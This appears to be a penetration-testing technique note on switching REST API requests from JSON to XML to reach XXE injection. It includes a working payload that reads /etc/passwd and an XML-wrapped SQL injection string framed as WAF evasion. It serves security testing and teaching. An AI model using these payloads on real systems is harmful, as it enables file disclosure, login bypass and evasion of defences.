# Content-Type Confusion + XXE via REST API

## When this applies

- Endpoint accepts JSON in normal use but ALSO parses other content-types when supplied.
- Server-side library auto-dispatches based on `Content-Type` header.
- Goal: switch to `application/xml` and inject XXE to read files / SSRF / DoS.

## Technique

Convert JSON request bodies to XML / form-data / SOAP and submit. If the server accepts the alternate format, you bypass JSON-only validators and can inject XXE in XML payloads.

## Steps

### Common content types

```
application/json
application/xml
application/x-www-form-urlencoded
multipart/form-data
text/plain
text/xml
application/soap+xml
application/vnd.api+json
application/graphql
```

### JSON to XML conversion

```json
Original (JSON):
{"username": "admin", "password": "pass"}
```

```xml
Convert to XML:
<?xml version="1.0"?>
<root>
  <username>admin</username>
  <password>pass</password>
</root>
```

### XXE exploitation

```http
POST /api/login HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <username>&xxe;</username>
  <password>pass</password>
</root>
```

### JSON to XML bypass (WAF evasion example)

```http
# Original (blocked)
POST /api/login HTTP/1.1
Content-Type: application/json
{"username":"admin' OR '1'='1","password":"pass"}

# Bypass
POST /api/login HTTP/1.1
Content-Type: application/xml
<?xml version="1.0"?>
<root>
  <username>admin' OR '1'='1</username>
  <password>pass</password>
</root>
```

### Content type converter — Burp BApp

**Content Type Converter BApp:** Auto-converts between JSON/XML.
1. Right-click request → Content Type Converter → Convert to XML
2. Send to Repeater
3. Inject XXE / SQL / etc.

### Workflow

1. Send the original JSON request.
2. Convert Content-Type to `application/xml`, `text/xml`, `application/soap+xml`, or `application/x-www-form-urlencoded`.
3. Restructure the body to match the new content type.
4. Inject XXE / SQL / other payloads in the alternate format.
5. Observe responses for the injected behavior.

## Verifying success

- The server returns 200 with content suggesting the alternate body was parsed (e.g., echoing the username).
- XXE delivers file content (`/etc/passwd` lines visible in response or out-of-band).
- WAF that blocked JSON injection lets XML/form-encoded version through.

## Common pitfalls

- Some servers strictly require `Content-Type: application/json` and reject others — XXE attempt will fail with 415.
- DTD parsing may be disabled (`disallow-doctype-decl`) — try parameter entities or out-of-band exfiltration.
- SOAP endpoints often have separate, stricter parsers — XXE more likely there.

## Tools

- Burp Suite Repeater
- Burp Content Type Converter BApp
- Burp Active Scan++ (XXE checks)
- xxeftp / Burp Collaborator (out-of-band exfiltration)
